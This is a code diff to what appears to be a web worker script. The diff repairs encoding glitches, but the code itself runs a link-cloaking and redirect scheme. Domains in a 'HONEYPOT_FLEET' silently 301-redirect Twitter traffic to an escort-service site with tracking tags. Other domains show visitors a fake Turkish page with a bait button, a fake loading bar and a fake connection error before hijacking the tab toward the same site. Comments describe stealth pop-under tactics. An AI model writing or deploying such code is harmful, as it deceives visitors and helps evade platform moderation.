@@ -45,13 +45,13 @@ export default {
 
     // 1. Determine Fleet and Niche Based on Hostname
     const config = HONEYPOT_FLEET.find(d => host.includes(d.domain));
-    const fleet = config Ş config.fleet : 'GHOST';
-    const niche = config Ş config.niche : 'cloak';
+    const fleet = config ? config.fleet : 'GHOST';
+    const niche = config ? config.niche : 'cloak';
 
     // 2. DRKCNAY Cloak (Twitter Redirect Logic)
     // If this is a link shortener domain, instantly redirect to the VIP site with utm tags
     if (niche === 'cloak') {
-      const targetUrl = `https://vipescorthizmeti.com${url.pathname === '/' Ş '/amp/istanbul' : url.pathname}Şutm_source=x_army&utm_medium=cloak&utm_campaign=${host}`;
+      const targetUrl = `https://vipescorthizmeti.com${url.pathname === '/' ? '/amp/istanbul' : url.pathname}?utm_source=x_army&utm_medium=cloak&utm_campaign=${host}`;
       return Response.redirect(targetUrl, 301);
     }
 
@@ -75,7 +75,7 @@ export default {
     }
 
     const html = `
-      <'DOCTYPE html>
+      <!DOCTYPE html>
       <html lang="tr">
       <head>
           <meta charset="UTF-8">
@@ -101,12 +101,12 @@ export default {
               <button class="btn" id="actionBtn" onclick="startTrap()">${buttonText}</button>
               
               <div class="loading" id="loadingBar">
-                  <div class="spinner"></div>
+                   <div class="spinner"></div>
                   ${fakeLoadingText}
               </div>
               
               <div id="resultBox" style="display: none; margin-top: 1rem; color: #e11d48; font-weight: bold;">
-                  Bağlantı Hatası' Sunucuya ulaşılamıyor.
+                  Bağlantı Hatası! Sunucuya ulaşılamıyor.
               </div>
           </div>
 
@@ -121,7 +121,7 @@ export default {
                       document.getElementById('resultBox').style.display = 'block';
                       
                       // Pop-Under Logic: Open VIP Escort site in a new invisible tab or redirect the current tab
-                      const vipUrl = "https://vipescorthizmeti.com/amp/istanbulŞutm_source=honey_pot&utm_medium=popunder&utm_campaign=${niche}";
+                      const vipUrl = "https://vipescorthizmeti.com/amp/istanbul?utm_source=honey_pot&utm_medium=popunder&utm_campaign=${niche}";
                       
                       // We redirect the current window to the VIP site (highest conversion)
                       // In a real stealth pop-under, we'd open a new window and focus back on the old one.
